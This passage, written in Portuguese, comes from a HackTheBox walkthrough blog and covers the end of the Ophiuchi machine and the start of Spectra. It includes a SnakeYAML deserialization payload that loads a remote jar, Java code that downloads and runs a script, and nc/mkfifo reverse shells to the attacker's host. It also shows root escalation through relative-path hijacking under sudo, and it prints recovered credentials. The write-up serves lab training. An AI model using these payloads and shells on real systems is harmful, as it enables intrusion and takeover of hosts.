</code></pre></div></div>

<h3 id="8080tcp---tomcat">8080/TCP - Tomcat</h3>

<p>Acessando a página tomcat em <code class="language-plaintext highlighter-rouge">http://10.10.10.227:8080</code> vemos uma página para parsing de YAML, conforme podemos ver abaixo:</p>

<p><img src="https://i.imgur.com/oDXT0S9.png" alt="Ophiuchi - Parse YAML" class="align-center" /></p>

<p>Ao enviar um valor YAML simples (<code class="language-plaintext highlighter-rouge">teste: true</code>), a seguinte mensagem é retornada:</p>

<blockquote>
  <p>Due to security reason this feature has been temporarily on hold. We will soon fix the issue!</p>
</blockquote>

<p>Já que o Tomcat é um webserver para aplicações java e, com base na mensagem retornada, busquei por <code class="language-plaintext highlighter-rouge">java yaml rce vulnerability</code> onde encontrei <a href="https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858">um post no Medium</a> sobre uma vulnerabilidade chamada <strong>SnakeYAML</strong>, em que a prova de conceito nesta página se parecia bastante com a página a ser explorada. Adicionalmente, como <em>Snake</em> faz referência ao nome da constelação <em>ophiucus</em>, mostra que estamos no caminho certo :smile:.</p>

<p>Seguindo a sugestão, iniciado um servidor http via <code class="language-plaintext highlighter-rouge">sudo python3 -m http.server 80</code> e enviado o seguinte payload ao website:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!!</span><span class="n">javax</span><span class="o">.</span><span class="na">script</span><span class="o">.</span><span class="na">ScriptEngineManager</span> <span class="o">[</span>
  <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URLClassLoader</span> <span class="o">[[</span>
    <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URL</span> <span class="o">[</span><span class="s">"http://10.10.10.10/"</span><span class="o">]</span>
  <span class="o">]]</span>
<span class="o">]</span>
</code></pre></div></div>

<p>Conforme a PoC no site, o servidor busca um arquivo em <code class="language-plaintext highlighter-rouge">/META-INF/services/javax.script.ScriptEngineFactory</code> que, contenha uma classe Java a ser executada, o que pode ser confirmado com base nos logs do python http server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.227 - - <span class="o">[</span>28/Feb/2021 12:19:22] code 404, message File not found
10.10.10.227 - - <span class="o">[</span>28/Feb/2021 12:19:22] <span class="s2">"HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1"</span> 404 -
</code></pre></div></div>

<h2 id="acesso-inicial">Acesso inicial</h2>

<p>Para obter o acesso inicial utilizei o projeto mencionado no post encontrado (<a href="https://github.com/artsploit/yaml-payload">artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads</a>).</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/artsploit/yaml-payload.git
</code></pre></div></div>

<p>Conforme recomendado, vamos colocar o nosso payload na classe chamada <code class="language-plaintext highlighter-rouge">AwesomeScriptEngineFactory.java</code> e compilá-lo, para que seja invocado utilizando o mecanismo que pudemos validar no formulário.</p>

<p>Ao modificar inicialmente o arquivo <code class="language-plaintext highlighter-rouge">yaml-payload\src\artsploit\AwesomeScriptEngineFactory.java</code>, incluí o payload <code class="language-plaintext highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f</code>, porém como possui alguns redirects e pipelines (<code class="language-plaintext highlighter-rouge">&gt;</code> e <code class="language-plaintext highlighter-rouge">|</code>) notei que não funcionou conforme esperado e parti para a estratégia de colocar o payload em um arquivo de texto na máquina local, a ser baixado via HTTP para a subsequente execução na máquina alvo conforme abaixo:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="nf">AwesomeScriptEngineFactory</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"wget http://10.10.10.10/payload -O /tmp/exploit.sh"</span><span class="o">);</span>
            <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"chmod a+x /tmp/exploit.sh"</span><span class="o">);</span>
            <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"bash /tmp/exploit.sh"</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>Após modificar a classe, precisamos compilá-la para que seja executada e disponibilizar o arquivo <code class="language-plaintext highlighter-rouge">*.jar</code> no diretório de onde vamos chamá-lo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javac src/artsploit/AwesomeScriptEngineFactory.java
jar <span class="nt">-cvf</span> yaml-payload.jar <span class="nt">-C</span> src/ <span class="nb">.</span>
</code></pre></div></div>

<p>Após compilado, precisamos configurar um HTTP Server com o arquivo payload contendo a nossa instrução para shell reverso e enviar o payload a seguir no formulário web</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!!</span><span class="n">javax</span><span class="o">.</span><span class="na">script</span><span class="o">.</span><span class="na">ScriptEngineManager</span> <span class="o">[</span>
  <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URLClassLoader</span> <span class="o">[[</span>
    <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URL</span> <span class="o">[</span><span class="s">"http://10.10.10.10/yaml-payload.jar"</span><span class="o">]</span>
  <span class="o">]]</span>
<span class="o">]</span>
</code></pre></div></div>

<p>Voilá! temos um shell reverso na máquina! :smile:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0<span class="nv">$ </span><span class="nb">hostname</span> <span class="o">&amp;&amp;</span> <span class="nb">id
</span>ophiuchi
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>tomcat<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>tomcat<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>tomcat<span class="o">)</span>
bash-5.0<span class="err">$</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<p>Iniciamos a enumeração como de costume executando o <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, onde pudemos identificar os seguintes pontos:</p>

<ul>
  <li>Execução com a conta de serviço do Tomcat, com a qual temos privilégios de leitura dos arquivos relacionados à configuração do serviço e respectivas logs</li>
  <li>O usuário a ser buscado é o <strong>admin</strong>, único com acesso console à máquina.</li>
</ul>

<p>Com estas informações, realizado consulta do arquivo <code class="language-plaintext highlighter-rouge">/opt/tomcat/conf/tomcat-users.xml</code> que possui as credenciais dos usuários do tomcat, para que pudéssemos acessar a console</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">"admin"</span> <span class="na">password=</span><span class="s">"whythereisalimit"</span> <span class="na">roles=</span><span class="s">"manager-gui,admin-gui"</span><span class="nt">/&gt;</span>
</code></pre></div></div>

<p>Uma vez que temos as credenciais de administração do Tomcat, foi possível acessar a console de gerenciamento confirmando que a credencial encontrada era válida.</p>

<p><img src="https://i.imgur.com/x7m50Ah.png" alt="Ophiuchi - Tomcat Manager" class="align-center" /></p>

<p>Como temos uma conta no Linux chamada <code class="language-plaintext highlighter-rouge">admin</code>, ao tentar reutilizar a mesma credencial via ssh, tivemos êxito ao reutilizar a senha que possuíamos, obtendo assim a flag de usuário.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Last login: Sun Apr 18 01:22:24 2021 from 10.10.10.10
<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">hostname</span> <span class="o">&amp;&amp;</span> <span class="nb">id
</span>ophiuchi
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span>
<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">cat </span>user.txt 
&lt;redacted&gt;
<span class="nt">-bash-5</span>.0<span class="err">$</span>
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>Embora normalmente execute o <code class="language-plaintext highlighter-rouge">linpeas.sh</code> para uma enumeração mais completa, uma vez que temos a senha do usuário <strong>admin</strong>, uma coisa que sempre valido é se o usuário em questão possui privilégios de sudo em algum tipo de processo/comando.</p>

<p>Ao executar desta vez tive a felicidade de ver o seguinte output:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>admin on ophiuchi:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User admin may run the following commands on ophiuchi:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
</code></pre></div></div>

<p>Inspecionando o arquivo <code class="language-plaintext highlighter-rouge">/opt/wasm-functions/index.go</code> temos o seguinte conteúdo:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
        <span class="s">"fmt"</span>
        <span class="n">wasm</span> <span class="s">"github.com/wasmerio/wasmer-go/wasmer"</span>
        <span class="s">"os/exec"</span>
        <span class="s">"log"</span>
<span class="p">)</span>


<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">bytes</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">wasm</span><span class="o">.</span><span class="n">ReadBytes</span><span class="p">(</span><span class="s">"main.wasm"</span><span class="p">)</span>

        <span class="n">instance</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">wasm</span><span class="o">.</span><span class="n">NewInstance</span><span class="p">(</span><span class="n">bytes</span><span class="p">)</span>
        <span class="k">defer</span> <span class="n">instance</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>
        <span class="n">init</span> <span class="o">:=</span> <span class="n">instance</span><span class="o">.</span><span class="n">Exports</span><span class="p">[</span><span class="s">"info"</span><span class="p">]</span>
        <span class="n">result</span><span class="p">,</span><span class="n">_</span> <span class="o">:=</span> <span class="n">init</span><span class="p">()</span>
        <span class="n">f</span> <span class="o">:=</span> <span class="n">result</span><span class="o">.</span><span class="n">String</span><span class="p">()</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">!=</span> <span class="s">"1"</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Not ready to deploy"</span><span class="p">)</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Ready to deploy"</span><span class="p">)</span>
                <span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"deploy.sh"</span><span class="p">)</span><span class="o">.</span><span class="n">Output</span><span class="p">()</span>
                <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
                        <span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
                <span class="p">}</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">))</span>
        <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Como podemos ver, as variáveis são carregadas a partir do arquivo <code class="language-plaintext highlighter-rouge">main.wasm</code> e, se a variavel <code class="language-plaintext highlighter-rouge">f</code> em <code class="language-plaintext highlighter-rouge">info</code> for igual à <strong>1</strong>, o arquivo <code class="language-plaintext highlighter-rouge">deploy.sh</code> é executado.</p>

<p>Como ambos os arquivos (<code class="language-plaintext highlighter-rouge">main.wasm</code> e <code class="language-plaintext highlighter-rouge">deploy.sh</code>) executam a partir de um caminho relativo, são vulneráveis a <strong>path hijacking</strong>, o que realizaremos agora.</p>

<p>O passo inicial é criar os dois arquivos conforme faremos nos passos a seguir executando a partir de um diretório onde temos privilégio de gravação, neste caso em <code class="language-plaintext highlighter-rouge">/dev/shm</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /dev/shm/zurc
<span class="nb">cd</span> /dev/shm/zurc
</code></pre></div></div>

<h3 id="deploysh"><code class="language-plaintext highlighter-rouge">deploy.sh</code></h3>

<p>A crição deste arquivo será bem simples. Apenas criaremos um script no diretório recém-criado e executar o comando <code class="language-plaintext highlighter-rouge">id</code> para comprovar a execução.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nb">id</span>
</code></pre></div></div>

<p>Uma vez que o procedimento funcione, alteraremos o script para o seguinte, que enviará um shell reverso para a máquina atacante</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nb">rm</span> /tmp/zurc<span class="p">;</span><span class="nb">mkfifo</span> /tmp/zurc<span class="p">;</span><span class="nb">cat</span> /tmp/zurc|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.10.10 4443 <span class="o">&gt;</span>/tmp/zurc
</code></pre></div></div>

<h3 id="mainwasm"><code class="language-plaintext highlighter-rouge">main.wasm</code></h3>

<p>Este item é um pouco mais complexo, pois abrindo um dos arquivos encontrados em um editor, notamos que se trata de algo compilado e não um arquivo em texto plano.</p>

<p>Pesquisando um pouco em como modificar um arquivo wasm, encontrei no site Mozilla developers <a href="https://developer.mozilla.org/en-US/docs/WebAssembly/Text_format_to_wasm">como converter um WebAssembly Text para WASM</a>, que faz referência ao repositório <a href="https://github.com/webassembly/wabt">WebAssembly/wabt: The WebAssembly Binary Toolkit no GitHub</a>.</p>

<p>Os seguintes passos foram realizados para inspecionar e modificar o arquivo <code class="language-plaintext highlighter-rouge">main.wasm</code>:</p>

<ul>
  <li>Localizado o arquivo <code class="language-plaintext highlighter-rouge">main.wasm</code> na máquina e copiado o principal para a máquina atacante</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Ophiuchi</span>
admin@ophiuchi:~<span class="nv">$ </span>find / <span class="nt">-type</span> f 2&gt; /dev/null | <span class="nb">grep </span>main.wasm
/opt/wasm-functions/main.wasm
/opt/wasm-functions/backup/main.wasm
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Attacker Machine</span>
<span class="nv">$ </span><span class="nb">cd</span> ./loot
<span class="nv">$ </span>scp admin@10.10.10.227:/opt/wasm-functions/main.wasm <span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>Baixado versão compilada do <code class="language-plaintext highlighter-rouge">wabt</code> para o diretório onde estávamos trabalhando</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz
<span class="nb">tar</span> <span class="nt">-xzvf</span> wabt-1.0.23-ubuntu.tar.gz
</code></pre></div></div>

<ul>
  <li>Convertido <code class="language-plaintext highlighter-rouge">main.wasm</code> para <code class="language-plaintext highlighter-rouge">main.wat</code>, retornando o seguinte conteúdo</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wabt-1.0.23/bin/wasm2wat main.wasm <span class="nt">-o</span> main.wat
<span class="nv">$ </span><span class="nb">cat </span>main.wat                                                                                           
<span class="o">(</span>module
  <span class="o">(</span><span class="nb">type</span> <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>func <span class="o">(</span>result i32<span class="o">)))</span>
  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type </span>0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
      i32.const 0<span class="o">)</span>
  <span class="o">(</span>table <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> 1 1 funcref<span class="o">)</span>
  <span class="o">(</span>memory <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> 16<span class="o">)</span>
  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>mut i32<span class="o">)</span> <span class="o">(</span>i32.const 1048576<span class="o">))</span>
  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>1<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>2<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">"memory"</span> <span class="o">(</span>memory 0<span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">"info"</span> <span class="o">(</span>func <span class="nv">$info</span><span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">"__data_end"</span> <span class="o">(</span>global 1<span class="o">))</span>
  <span class="o">(</span><span class="nb">export</span> <span class="s2">"__heap_base"</span> <span class="o">(</span>global 2<span class="o">)))</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Uma vez que precisamos retornar o valor <code class="language-plaintext highlighter-rouge">f == 1</code>, o valor vem da função <code class="language-plaintext highlighter-rouge">info</code>, onde faremos a alteração do valor <code class="language-plaintext highlighter-rouge">i32.const 0</code> para <code class="language-plaintext highlighter-rouge">i32.const 1</code></p>
  </li>
  <li>
    <p>Após alterá-lo, compilei novamente o arquivo para <code class="language-plaintext highlighter-rouge">main.wasm</code>, conforme comando abaixo e copiei para a máquina vítima no diretório que estamos trabalhando</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wabt-1.0.23/bin/wat2wasm main.wat <span class="nt">-o</span> main.wasm
scp main.wasm admin@10.10.10.227:/dev/shm/zurc
</code></pre></div></div>

<ul>
  <li>Em uma segunda tentativa tive sucesso na execução do código :smiley:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@ophiuchi:/dev/shm/zurc<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Uma vez confirmado o funcionamento, alterado o conteúdo do arquivo <code class="language-plaintext highlighter-rouge">deploy.sh</code> conforme previamente mencionado para obter o shell reverso, onde pude assim obter a flag de root.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4443
listening on <span class="o">[</span>any] 4443 ...
connect to <span class="o">[</span>10.10.10.10] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227] 50068
<span class="c"># hostname &amp;&amp; id</span>
ophiuchi
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c"># cat /root/root.txt</span>
&lt;redacted&gt;
</code></pre></div></div>

<p>Espero que tenham gostado!</p>

<p>Vejo vocês no próximo post :smile:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Medium" /><category term="HTB Linux" /><summary type="html"><![CDATA[Olá pessoal! A máquina desta semana será Ophiuchi, outra máquina Linux classificada como mediana do Hack The Box, criada por felamos.]]></summary></entry><entry><title type="html">Walktrough: HTB Spectra</title><link href="https://davicruz.com/walkthrough/2021/06/htb-spectra" rel="alternate" type="text/html" title="Walktrough: HTB Spectra" /><published>2021-06-26T13:00:00-03:00</published><updated>2021-06-26T13:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/06/htb-spectra</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/06/htb-spectra"><![CDATA[<p>Olá pessoal!</p>

<p>A máquina desta semana será <strong>Spectra</strong>, outra máquina Linux classificada como fácil do <a href="https://www.hackthebox.eu">Hack The Box</a>, criada por <a href="https://app.hackthebox.eu/users/1190">egre55</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas</p>

<p><img src="https://i.imgur.com/OqO1ZZh.png" alt="HTB Spectra" class="align-center" /></p>

<h2 id="enumeração">Enumeração</h2>

<p>Como de costume, iniciamos sempre com um scan rápido utilizando o <code class="language-plaintext highlighter-rouge">nmap</code> a fim de identificar os serviços publicados nesta máquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ target</span><span class="o">=</span>10.10.10.229<span class="p">;</span> nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick <span class="nv">$target</span>
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-12 12:57 EST
Nmap scan report <span class="k">for </span>10.10.10.229
Host is up <span class="o">(</span>0.079s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a <span class="o">(</span>RSA<span class="o">)</span>
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.73 seconds
</span></code></pre></div></div>

<h3 id="80tcp---serviço-http">80/TCP - Serviço HTTP</h3>

<p>Ao acessar o serviço publicado na porta 80 TCP, vemos uma página HTML muito simples com uma mensagem e dois links.</p>

<p>Ao inspecionar o código fonte desta página, vemos que estes fazem referência para o dns <code class="language-plaintext highlighter-rouge">spectra.htb</code>, o qual foi incluído no arquivo hosts local para resolução correta deste nome.</p>

<p><img src="https://i.imgur.com/ady30IK.png" alt="Spectra HTB - Issue Tracking page" class="align-center" /></p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>Issue Tracking<span class="nt">&lt;/h1&gt;</span>

<span class="nt">&lt;h2&gt;</span>Until IT set up the Jira we can configure and use this for issue tracking.<span class="nt">&lt;/h2&gt;</span>

<span class="nt">&lt;h2&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://spectra.htb/main/index.php"</span> <span class="na">target=</span><span class="s">"mine"</span><span class="nt">&gt;</span>Software Issue Tracker<span class="nt">&lt;/a&gt;&lt;/h2&gt;</span>
<span class="nt">&lt;h2&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://spectra.htb/testing/index.php"</span> <span class="na">target=</span><span class="s">"mine"</span><span class="nt">&gt;</span>Test<span class="nt">&lt;/a&gt;&lt;/h2&gt;</span>
</code></pre></div></div>

<p>Ao acessar ambos os links, notado que se trata de sites em WordPress, porém apenas o primeiro (<em>Software Issue Tracker</em>) estava funcionando corretamente, enquanto o segundo (<em>Test</em>), apresentava um erro de conexão com o banco de dados.</p>

<p><img src="https://i.imgur.com/QRXqNtu.png" alt="HTB Spectra - Software Issue Tracker" class="align-center" /></p>

<p><img src="https://i.imgur.com/lqTri7v.png" alt="HTB Spectra - Testing" class="align-center" /></p>

<h4 id="wpscan">WPScan</h4>

<p>Para obter mais informações sobre ambos os sites WordPress identificados, executado o WPScan neles utilizando os seguintes parâmetros, embora tenha funcionado apenas para o site principal, uma vez que o segundo não estava em pleno funcionamento.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> &lt;url&gt; <span class="nt">-e</span> vp,vt,tt,cb,dbe,u,m <span class="nt">--plugins-detection</span> aggressive <span class="nt">--plugins-version-detection</span> aggressive <span class="nt">-f</span> cli-no-color 2&gt;&amp;1 | <span class="nb">tee</span> <span class="s2">"./wpscan_&lt;url&gt;.txt"</span>
</code></pre></div></div>

<p>Os seguintes pontos foram identificados para o site <code class="language-plaintext highlighter-rouge">main</code> (<em>Software Issue Tracking</em>):</p>

<ul>
  <li>Versão do WordPress: 5.4.2</li>
  <li>Usuários: administrator</li>
</ul>

<p>Dando continuidade com a enumeração de forma manual, notei que para o site <em>Testing</em>, não há um redirect para o <code class="language-plaintext highlighter-rouge">index.php</code> por padrão, listando assim o conteúdo da instalação do WordPress, onde podemos identificar um arquivo interessante: <strong><code class="language-plaintext highlighter-rouge">wp-config.php.save</code></strong>.</p>

<p><img src="https://i.imgur.com/0pPowA4.png" alt="image-20210515144447118" class="align-center" /></p>

<p>Como este arquivo não está com a extensão <code class="language-plaintext highlighter-rouge">*.php</code>, ele não será interpretado pelo servidor assim como os demais e poderemos realizar o seu download, conforme executado via linha de comando abaixo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://spectra.htb/testing/wp-config.php.save
</code></pre></div></div>

<p>Inspecionando seu conteúdo, podemos ver as seguintes credenciais para o usuário de banco de dados:</p>

<blockquote>
  <p>Username: devtest</p>

  <p>Password: devteam01</p>
</blockquote>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ** MySQL settings - You can get this info from your web host ** //</span>
<span class="cd">/** The name of the database for WordPress */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'dev'</span> <span class="p">);</span>

<span class="mf">...</span><span class="n">skipping</span> <span class="mi">1</span> <span class="n">line</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'devtest'</span> <span class="p">);</span>

<span class="cd">/** MySQL database password */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'devteam01'</span> <span class="p">);</span>

<span class="cd">/** MySQL hostname */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span> <span class="p">);</span>

<span class="cd">/** Database Charset to use in creating database tables. */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_CHARSET'</span><span class="p">,</span> <span class="s1">'utf8'</span> <span class="p">);</span>

<span class="cd">/** The Database Collate type. Don't change this if in doubt. */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_COLLATE'</span><span class="p">,</span> <span class="s1">''</span> <span class="p">);</span>
</code></pre></div></div>

<p>Como na enumeração do <code class="language-plaintext highlighter-rouge">nmap</code> havia sido listado uma instancia de MySQL, mas que não tínhamos acesso de forma não autenticada, agora podemos testar estas credenciais a partir de linha de comando, porém meu endereço IP não está autorizado a se conectar na instância, nos impedindo assim de validar as credenciais</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>mysql <span class="nt">-u</span> devtest <span class="nt">-p</span> <span class="nt">-h</span> spectra.htb
Enter password:
ERROR 1130 <span class="o">(</span>HY000<span class="o">)</span>: Host <span class="s1">'10.10.10.10'</span> is not allowed to connect to this MySQL server
</code></pre></div></div>

